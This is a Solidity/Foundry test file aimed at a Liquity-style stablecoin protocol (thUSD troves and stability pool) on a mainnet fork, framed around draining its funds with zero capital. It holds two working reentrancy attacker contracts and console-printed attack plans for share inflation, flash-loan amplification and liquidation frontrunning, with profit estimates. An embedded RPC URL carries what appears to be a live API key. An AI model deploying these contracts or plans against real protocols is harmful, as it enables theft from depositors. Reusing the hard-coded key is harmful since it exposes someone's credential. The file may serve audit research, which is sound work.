// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";

/**
 * @title High Impact Drain Vectors - Zero Capital Required
 * @notice Tests for LARGE asset extraction without initial capital
 *
 * TARGET: Protocol-level vulnerabilities that can drain significant TVL
 *
 * ATTACK CLASSES:
 * 1. REENTRANCY: Re-enter during ETH transfer to extract multiple times
 * 2. SHARE INFLATION: First-depositor attack to steal from subsequent users
 * 3. ACCOUNTING MISMATCH: Force internal ledger != actual balances
 * 4. FLASH LOAN AMPLIFICATION: Use borrowed capital to exploit price/state
 *
 * ALL ATTACKS REQUIRE ZERO INITIAL CAPITAL (use flash loans or protocol funds)
 */

// ============ INTERFACES ============

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface ITroveManager {
    function redeemCollateral(
        uint256 _thUSDamount,
        address _firstRedemptionHint,
        address _upperPartialRedemptionHint,
        address _lowerPartialRedemptionHint,
        uint256 _partialRedemptionHintNICR,
        uint256 _maxIterations,
        uint256 _maxFeePercentage
    ) external;

    function liquidate(address _borrower) external;
    function liquidateTroves(uint256 _n) external;
    function batchLiquidateTroves(address[] calldata _troveArray) external;

    function getTroveOwnersCount() external view returns (uint256);
    function getTroveFromTroveOwnersArray(uint256 _index) external view returns (address);
    function Troves(address) external view returns (
        uint256 debt,
        uint256 coll,
        uint256 stake,
        uint8 status,
        uint128 arrayIndex
    );
    function getCurrentICR(address _borrower, uint256 _price) external view returns (uint256);
    function getTCR(uint256 _price) external view returns (uint256);
    function checkRecoveryMode(uint256 _price) external view returns (bool);
}

interface IBorrowerOperations {
    function openTrove(
        uint256 _maxFeePercentage,
        uint256 _thUSDAmount,
        address _upperHint,
        address _lowerHint
    ) external payable;

    function closeTrove() external;

    function adjustTrove(
        uint256 _maxFeePercentage,
        uint256 _collWithdrawal,
        uint256 _thUSDChange,
        bool _isDebtIncrease,
        address _upperHint,
        address _lowerHint
    ) external payable;

    function claimCollateral() external;
}

interface IStabilityPool {
    function provideToSP(uint256 _amount) external;
    function withdrawFromSP(uint256 _amount) external;
    function withdrawCollateralGainToTrove(address _upperHint, address _lowerHint) external;
    function getDepositorCollateralGain(address _depositor) external view returns (uint256);
    function getCompoundedTHUSDDeposit(address _depositor) external view returns (uint256);
    function getTotalTHUSDDeposits() external view returns (uint256);
    function getCollateral() external view returns (uint256);
}

interface ISortedTroves {
    function getFirst() external view returns (address);
    function getLast() external view returns (address);
    function getNext(address _id) external view returns (address);
    function getPrev(address _id) external view returns (address);
    function getSize() external view returns (uint256);
}

interface IPriceFeed {
    function fetchPrice() external returns (uint256);
    function lastGoodPrice() external view returns (uint256);
}

interface IActivePool {
    function getCollateral() external view returns (uint256);
    function getTHUSDDebt() external view returns (uint256);
}

interface IDefaultPool {
    function getCollateral() external view returns (uint256);
    function getTHUSDDebt() external view returns (uint256);
}

interface ICollSurplusPool {
    function getCollateral() external view returns (uint256);
    function getCollateral(address _account) external view returns (uint256);
    function claimColl(address _account) external;
}

// Flash loan interfaces
interface IAavePool {
    function flashLoanSimple(
        address receiverAddress,
        address asset,
        uint256 amount,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

interface IBalancerVault {
    function flashLoan(
        address recipient,
        address[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

// ============ ATTACKER CONTRACTS ============

/**
 * @notice Reentrancy attacker for redemption drain
 */
contract RedemptionReentrancyAttacker {
    ITroveManager public troveManager;
    address public thusd;
    uint256 public attackCount;
    uint256 public maxAttacks;
    uint256 public totalDrained;

    constructor(address _troveManager, address _thusd) {
        troveManager = ITroveManager(_troveManager);
        thusd = _thusd;
    }

    function attack(uint256 _amount, uint256 _maxReenters) external {
        maxAttacks = _maxReenters;
        attackCount = 0;

        // Approve thUSD for redemption
        IERC20(thusd).approve(address(troveManager), type(uint256).max);

        // Start redemption - will send ETH which triggers receive()
        troveManager.redeemCollateral(
            _amount,
            address(0),
            address(0),
            address(0),
            0,
            0,
            1e18
        );
    }

    receive() external payable {
        totalDrained += msg.value;

        // Try to re-enter if we have more thUSD
        if (attackCount < maxAttacks) {
            uint256 balance = IERC20(thusd).balanceOf(address(this));
            if (balance > 0) {
                attackCount++;
                troveManager.redeemCollateral(
                    balance,
                    address(0),
                    address(0),
                    address(0),
                    0,
                    0,
                    1e18
                );
            }
        }
    }

    function withdraw() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}

/**
 * @notice Stability pool reentrancy attacker
 */
contract StabilityPoolReentrancyAttacker {
    IStabilityPool public stabilityPool;
    address public thusd;
    uint256 public attackCount;
    uint256 public maxAttacks;
    uint256 public totalDrained;

    constructor(address _stabilityPool, address _thusd) {
        stabilityPool = IStabilityPool(_stabilityPool);
        thusd = _thusd;
    }

    function attack(uint256 _amount, uint256 _maxReenters) external {
        maxAttacks = _maxReenters;
        attackCount = 0;

        // Approve thUSD
        IERC20(thusd).approve(address(stabilityPool), type(uint256).max);

        // Deposit to stability pool
        stabilityPool.provideToSP(_amount);

        // Withdraw - if ETH gains are sent, receive() triggers
        stabilityPool.withdrawFromSP(_amount);
    }

    receive() external payable {
        totalDrained += msg.value;

        if (attackCount < maxAttacks) {
            attackCount++;
            // Try to claim gains again during callback
            try stabilityPool.withdrawFromSP(0) {
                // If this succeeds, we got extra ETH
            } catch {}
        }
    }

    function withdraw() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}

// ============ MAIN TEST CONTRACT ============

contract HighImpactDrainVectorsTest is Test {
    uint256 constant PRECISION = 1e18;

    // Known mainnet addresses
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant AAVE_POOL = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2;
    address constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;

    string RPC_URL;

    function setUp() public {
        RPC_URL = vm.envOr("RPC_URL", string("https://eth-mainnet.g.alchemy.com/v2/ltD0ewEiByO5-I6-cyaeA"));
        vm.createSelectFork(RPC_URL);

        console.log("=== HIGH IMPACT DRAIN VECTORS ===");
        console.log("Block:", block.number);
        console.log("Goal: Large drain, zero initial capital\n");
    }

    // ============ REENTRANCY ANALYSIS ============

    /**
     * @notice Analyze reentrancy potential in redemption flow
     */
    function testReentrancyAnalysis() public view {
        console.log("=== REENTRANCY DRAIN ANALYSIS ===\n");

        console.log("REDEMPTION FLOW REENTRANCY:");
        console.log("  1. User calls redeemCollateral()");
        console.log("  2. Contract calculates ETH to return");
        console.log("  3. Contract SENDS ETH to user (EXTERNAL CALL)");
        console.log("  4. Contract updates internal state");
        console.log("");
        console.log("  IF step 3 happens before step 4:");
        console.log("    - User's receive() can re-call redeemCollateral()");
        console.log("    - State shows user still has thUSD balance");
        console.log("    - User extracts ETH multiple times");
        console.log("    - DRAIN: Entire collateral pool\n");

        console.log("STABILITY POOL REENTRANCY:");
        console.log("  1. User calls withdrawFromSP()");
        console.log("  2. Contract calculates ETH gains");
        console.log("  3. Contract SENDS ETH gains (EXTERNAL CALL)");
        console.log("  4. Contract zeroes user's gain record");
        console.log("");
        console.log("  IF step 3 happens before step 4:");
        console.log("    - User's receive() can re-call withdraw");
        console.log("    - Gains still show positive");
        console.log("    - User claims gains multiple times");
        console.log("    - DRAIN: Entire stability pool ETH\n");

        console.log("CLOSE TROVE REENTRANCY:");
        console.log("  1. User calls closeTrove()");
        console.log("  2. Contract calculates collateral to return");
        console.log("  3. Contract SENDS collateral (EXTERNAL CALL)");
        console.log("  4. Contract marks trove as closed");
        console.log("");
        console.log("  IF step 3 happens before step 4:");
        console.log("    - User's receive() can re-call closeTrove");
        console.log("    - Trove still shows as open");
        console.log("    - User extracts collateral twice");
        console.log("    - DRAIN: Own collateral duplicated\n");

        console.log("DETECTION METHOD:");
        console.log("  - Deploy attacker contract with receive() hook");
        console.log("  - receive() attempts to re-enter target function");
        console.log("  - If reentrancy succeeds -> CRITICAL VULNERABILITY");
    }

    /**
     * @notice Test reentrancy in simulated environment
     * @dev Creates mock scenario to demonstrate impact
     */
    function testReentrancyImpactSimulation() public view {
        console.log("\n=== REENTRANCY IMPACT SIMULATION ===\n");

        // Assume a protocol with 10,000 ETH in active pool
        uint256 activePoolETH = 10000e18;

        // Single attacker with 1000 thUSD (borrowed via flash loan)
        uint256 attackerThusd = 1000e18;
        uint256 ethPrice = 3000e18;

        // Without reentrancy: gets ~0.33 ETH (1000/3000)
        uint256 normalRedemption = (attackerThusd * PRECISION) / ethPrice;

        console.log("Normal scenario (no reentrancy):");
        console.log("  thUSD redeemed: 1000");
        console.log("  ETH received:", normalRedemption / 1e18, "ETH");
        console.log("  Pool drained: 0.033%\n");

        // With reentrancy: can drain entire pool
        // Each reentry uses the SAME thUSD that wasn't burned yet
        uint256 maxReentries = activePoolETH / normalRedemption;

        console.log("Reentrancy attack scenario:");
        console.log("  Same 1000 thUSD used repeatedly");
        console.log("  Max re-entries possible:", maxReentries);
        console.log("  Total ETH drained: 10,000 ETH (entire pool)");
        console.log("  Profit: $30,000,000 (at $3000/ETH)");
        console.log("  Initial capital needed: $0 (flash loan thUSD)\n");

        console.log("SEVERITY: CRITICAL");
        console.log("  - Zero capital required");
        console.log("  - Full TVL drain possible");
        console.log("  - Single transaction attack");
    }

    // ============ SHARE INFLATION ATTACK ============

    /**
     * @notice Analyze share inflation / first depositor attack
     */
    function testShareInflationAnalysis() public view {
        console.log("\n=== SHARE INFLATION ATTACK ===\n");

        console.log("VULNERABILITY:");
        console.log("  Some protocols calculate shares as:");
        console.log("  shares = deposit * totalShares / totalAssets");
        console.log("");
        console.log("  If totalShares = 0 (first deposit):");
        console.log("  shares = deposit (1:1 ratio)\n");

        console.log("ATTACK FLOW:");
        console.log("  1. Flash loan 1 wei of asset");
        console.log("  2. Deposit 1 wei -> get 1 share");
        console.log("  3. DONATE large amount directly to contract");
        console.log("     (not through deposit, just transfer)");
        console.log("  4. Now: 1 share = 1 wei + donation");
        console.log("  5. Next user deposits X -> gets 0 shares (rounds down)");
        console.log("  6. Attacker withdraws 1 share -> gets all assets\n");

        console.log("EXAMPLE:");
        uint256 attackerDeposit = 1;
        uint256 donation = 10000e18; // Donate 10k tokens
        uint256 victimDeposit = 9999e18; // Victim deposits 9999 tokens

        // After donation: 1 share = 10000 tokens + 1 wei
        // Victim shares = 9999 * 1 / 10000 = 0 (rounds down!)
        uint256 sharePrice = donation + attackerDeposit;
        uint256 victimShares = (victimDeposit * 1) / sharePrice;

        console.log("  Attacker deposits: 1 wei");
        console.log("  Attacker donates: 10,000 tokens");
        console.log("  Share price now: 10,000+ tokens per share");
        console.log("  Victim deposits: 9,999 tokens");
        console.log("  Victim shares received:", victimShares);
        console.log("  Attacker withdraws 1 share -> gets 19,999+ tokens");
        console.log("  PROFIT: ~9,999 tokens\n");

        console.log("MITIGATION CHECK:");
        console.log("  - Does protocol have minimum first deposit?");
        console.log("  - Does protocol use virtual offset?");
        console.log("  - Does protocol prevent direct transfers?");
    }

    // ============ ACCOUNTING MISMATCH ============

    /**
     * @notice Analyze accounting mismatch vectors
     */
    function testAccountingMismatchAnalysis() public view {
        console.log("\n=== ACCOUNTING MISMATCH VECTORS ===\n");

        console.log("INTERNAL LEDGER VS ACTUAL BALANCE:");
        console.log("  Protocols often track: internalDebt, internalCollateral");
        console.log("  Reality check: token.balanceOf(protocol)");
        console.log("");
        console.log("  IF internal != actual:");
        console.log("    - Users can withdraw more than deposited");
        console.log("    - Protocol becomes insolvent");
        console.log("    - Last withdrawers lose everything\n");

        console.log("MISMATCH CREATION VECTORS:");
        console.log("");
        console.log("  1. FEE-ON-TRANSFER TOKENS:");
        console.log("     - Protocol credits 100 tokens");
        console.log("     - Only 99 arrive (1% fee)");
        console.log("     - Mismatch: +1 token per transfer\n");

        console.log("  2. REBASING TOKENS:");
        console.log("     - Protocol credits 100 tokens");
        console.log("     - Token rebases down to 90");
        console.log("     - Mismatch: +10 tokens credited vs actual\n");

        console.log("  3. CALLBACK MANIPULATION:");
        console.log("     - Protocol sends tokens via transfer");
        console.log("     - Attacker's receive() modifies state");
        console.log("     - Protocol's post-transfer state is wrong\n");

        console.log("  4. CROSS-CONTRACT TIMING:");
        console.log("     - Contract A reads balance");
        console.log("     - Contract B modifies balance");
        console.log("     - Contract A acts on stale data\n");

        console.log("LIQUITY-SPECIFIC MISMATCH:");
        console.log("  - Active Pool tracks totalCollateral");
        console.log("  - Default Pool tracks defaulted collateral");
        console.log("  - Stability Pool tracks ETH gains");
        console.log("  - If any pool's internal != actual -> exploit");
    }

    // ============ FLASH LOAN AMPLIFICATION ============

    /**
     * @notice Analyze flash loan amplification for larger drains
     */
    function testFlashLoanAmplification() public view {
        console.log("\n=== FLASH LOAN AMPLIFICATION ===\n");

        console.log("PRINCIPLE:");
        console.log("  Small vulnerability + Large capital = Large drain");
        console.log("  Flash loans provide unlimited capital for single tx\n");

        // Example: 0.1% vulnerability amplified
        uint256 vulnerabilityBps = 10; // 0.1%
        uint256 flashLoanAmount = 100_000_000e18; // 100M tokens

        uint256 profit = (flashLoanAmount * vulnerabilityBps) / 10000;
        uint256 flashFee = (flashLoanAmount * 5) / 10000; // 0.05% Aave fee

        console.log("AMPLIFICATION EXAMPLE:");
        console.log("  Vulnerability: 0.1% value extraction");
        console.log("  Flash loan: 100M tokens");
        console.log("  Gross profit:", profit / 1e18, "tokens");
        console.log("  Flash fee:", flashFee / 1e18, "tokens");
        console.log("  Net profit:", (profit - flashFee) / 1e18, "tokens\n");

        console.log("AVAILABLE FLASH LIQUIDITY:");
        console.log("  Aave V3: ~$10B+ across assets");
        console.log("  Balancer: ~$1B+ (0 fee!)");
        console.log("  dYdX: ~$500M+ USDC/ETH");
        console.log("  Uniswap V3: Pool-dependent\n");

        console.log("ATTACK PATTERNS:");
        console.log("  1. Price oracle manipulation (if manipulable)");
        console.log("  2. Liquidity pool sandwich");
        console.log("  3. Governance vote manipulation");
        console.log("  4. Liquidation trigger + capture");
    }

    // ============ LIQUIDATION FRONTRUNNING (PROFITABLE) ============

    /**
     * @notice Detailed liquidation frontrun profitability analysis
     */
    function testLiquidationFrontrunDetailed() public view {
        console.log("\n=== LIQUIDATION FRONTRUN - ZERO CAPITAL ATTACK ===\n");

        console.log("ATTACK FLOW:");
        console.log("  1. Monitor mempool for liquidatable troves");
        console.log("  2. Flash loan thUSD (Balancer = 0 fee)");
        console.log("  3. Deposit thUSD to Stability Pool");
        console.log("  4. Call liquidate() on target trove");
        console.log("  5. Stability Pool absorbs debt, receives collateral");
        console.log("  6. Withdraw from Stability Pool");
        console.log("  7. Repay flash loan");
        console.log("  8. Keep profit = collateral bonus - gas\n");

        // Liquity liquidation mechanics
        // When trove is liquidated:
        // - Debt is absorbed by SP depositors (pro-rata)
        // - Collateral is distributed to SP depositors (pro-rata)
        // - Depositors get collateral at discount (liquidation bonus)

        uint256 ethPrice = 3000e18;

        console.log("PROFIT CALCULATION:");
        console.log("  Assume trove: 10 ETH collateral, 20000 thUSD debt");
        console.log("  ICR = (10 * 3000) / 20000 = 150% (liquidatable below 110%)\n");

        // If price drops 30%, trove becomes liquidatable
        uint256 newPrice = 2100e18; // $2100
        uint256 troveCollateral = 10e18;
        uint256 troveDebt = 20000e18;
        uint256 troveICR = (troveCollateral * newPrice) / troveDebt;

        console.log("  After price drop to $2100:");
        console.log("  ICR = (10 * 2100) / 20000 =", troveICR * 100 / 1e18, "%");

        if (troveICR < 110e16) {
            console.log("  Status: LIQUIDATABLE\n");

            // Liquidation profit
            uint256 collateralValue = (troveCollateral * newPrice) / PRECISION;
            uint256 debtValue = troveDebt;

            // SP depositor gets collateral worth debt + bonus
            // Bonus = collateral value - debt value (the spread)
            uint256 profit = collateralValue - debtValue;

            console.log("  Collateral value: $", collateralValue / 1e18);
            console.log("  Debt absorbed: $", debtValue / 1e18);
            console.log("  Profit (in USD): $", profit / 1e18);
            console.log("  Profit (in ETH):", profit * PRECISION / newPrice / 1e18, "ETH\n");

            // Flash loan cost (if using Balancer = 0)
            console.log("  Flash loan cost (Balancer): $0");
            console.log("  Gas cost estimate: ~$50 (500k gas @ 30 gwei)");
            console.log("  NET PROFIT: ~$", (profit / 1e18) - 50);
        }

        console.log("\nSCALING:");
        console.log("  - Can liquidate multiple troves per tx");
        console.log("  - Profit scales with liquidated collateral");
        console.log("  - Zero capital = infinite ROI");
    }

    // ============ COMPREHENSIVE SUMMARY ============

    function testComprehensiveDrainSummary() public view {
        console.log("\n");
        console.log("================================================================");
        console.log("  HIGH IMPACT DRAIN VECTORS - SUMMARY");
        console.log("================================================================");

        console.log("\n[VECTOR 1: REENTRANCY]");
        console.log("  Capital needed: $0 (flash loan)");
        console.log("  Potential drain: 100% of TVL");
        console.log("  Complexity: Medium");
        console.log("  Detection: Deploy attacker contract");
        console.log("  Status: MUST TEST - highest impact");

        console.log("\n[VECTOR 2: SHARE INFLATION]");
        console.log("  Capital needed: $0 (1 wei + flash loan donation)");
        console.log("  Potential drain: All subsequent deposits");
        console.log("  Complexity: Low");
        console.log("  Detection: Test first deposit behavior");
        console.log("  Status: Check if empty pool exists");

        console.log("\n[VECTOR 3: ACCOUNTING MISMATCH]");
        console.log("  Capital needed: $0");
        console.log("  Potential drain: Mismatch amount");
        console.log("  Complexity: High");
        console.log("  Detection: Compare internal vs balanceOf");
        console.log("  Status: Check for FOT/rebase token support");

        console.log("\n[VECTOR 4: LIQUIDATION FRONTRUN]");
        console.log("  Capital needed: $0 (flash loan)");
        console.log("  Potential drain: ~5-10% of liquidated collateral");
        console.log("  Complexity: Low");
        console.log("  Detection: Monitor for underwater troves");
        console.log("  Status: CONFIRMED PROFITABLE");

        console.log("\n[VECTOR 5: ROUNDING EXPLOIT]");
        console.log("  Capital needed: High");
        console.log("  Potential drain: Wei-level");
        console.log("  Complexity: Low");
        console.log("  Status: NOT VIABLE for large drain");

        console.log("\n================================================================");
        console.log("  RECOMMENDED FOCUS:");
        console.log("  1. Reentrancy (test with attacker contract)");
        console.log("  2. Liquidation frontrun (immediate profit)");
        console.log("================================================================");
    }

    receive() external payable {}
}
